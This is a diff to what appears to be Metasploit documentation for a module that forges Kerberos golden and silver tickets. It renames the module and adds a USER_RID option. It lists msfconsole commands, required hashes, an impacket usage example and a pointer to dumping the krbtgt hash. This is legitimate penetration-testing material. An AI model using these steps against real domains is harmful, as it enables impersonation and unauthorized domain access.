@@ -20,15 +20,16 @@ Any system leveraging kerberos as a means of authentication e.g. Active Director
 ## Verification Steps
 
 1. Start msfconsole
-2. Do: `use auxiliary/admin/kerberos/forge_kerberos_ticket`
+2. Do: `use auxiliary/admin/kerberos/forge_ticket`
 3. Do: `set DOMAIN DW.LOCAL`
 4. Do: `set DOMAIN_SID S-1-5-21-1755879683-3641577184-3486455962`
 5. Do: `set NTHASH 88E4D9FABAECF3DEC18DD80905521B29`
 6. Do: `set USER fake_user`
-7. Do: `set SPN MSSqlSvc/dc1.dw.local:1433` (Option only used for silver tickets)
-8. Do: `forge_silver` to generate a silver ticket or `forge_golden` for a golden ticket
-9. Use your ticket which will have been stored as loot with your chosen target
-10. Example usage in impacket:
+7. Do: `set USER_RID 500`
+8. Do: `set SPN MSSqlSvc/dc1.dw.local:1433` (Option only used for silver tickets)
+9. Do: `forge_silver` to generate a silver ticket or `forge_golden` for a golden ticket
+10. Use your ticket which will have been stored as loot with your chosen target
+11. Example usage in impacket:
     ```
     export KRB5CCNAME=/path/to/ticket
     python3 mssqlclient.py DW.LOCAL/fake_mysql@dc1.dw.local -k -no-pass
@@ -55,6 +56,7 @@ For golden ticket attacks, the following information is required:
 2. `DOMAIN_SID` - This is the Security Identifier for the system, i.e. `S-1-5-21-1266190811-2419310613-1856291569`
 3. `NTHASH` - The NTHASH for the krbtgt account, i.e. `767400b2c71afa35a5dca216f2389cd9`
 4. `USER` - This username will be stored within the forged ticket, this must be a user that exists in Active Directory
+5. `USER_RID` - The relative identifier(RID) for users will be stored within the forged ticket, i.e. Administrator accounts have a RID of `500`
 
 One way of extracting the krbtgt account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:
 
@@ -129,7 +131,8 @@ For silver ticket attacks the following information is required:
 2. `DOMAIN_SID` This is the Security Identifier for the system, i.e. `S-1-5-21-1266190811-2419310613-1856291569`
 3. `NTHASH` - The NTHASH for the service or computer account, i.e. `767400b2c71afa35a5dca216f2389cd9`
 4. `USER` - This username will be stored within the forged ticket, unlike with Golden tickets - this can be a non-existent user
-5. `SPN` - The Service Principal name, i.e. `CIFS` for SMB access, or `MSSqlSvc/dc1.dw.local:1433`. Other examples can be seen by running `setspn -q */*` on the target
+5. `USER_RID` - The relative identifier(RID) for users will be stored within the forged ticket, i.e. Administrator accounts have a RID of `500`
+6. `SPN` - The Service Principal name, i.e. `CIFS` for SMB access, or `MSSqlSvc/dc1.dw.local:1433`. Other examples can be seen by running `setspn -q */*` on the target
 
 Example Service Principal Names:
 
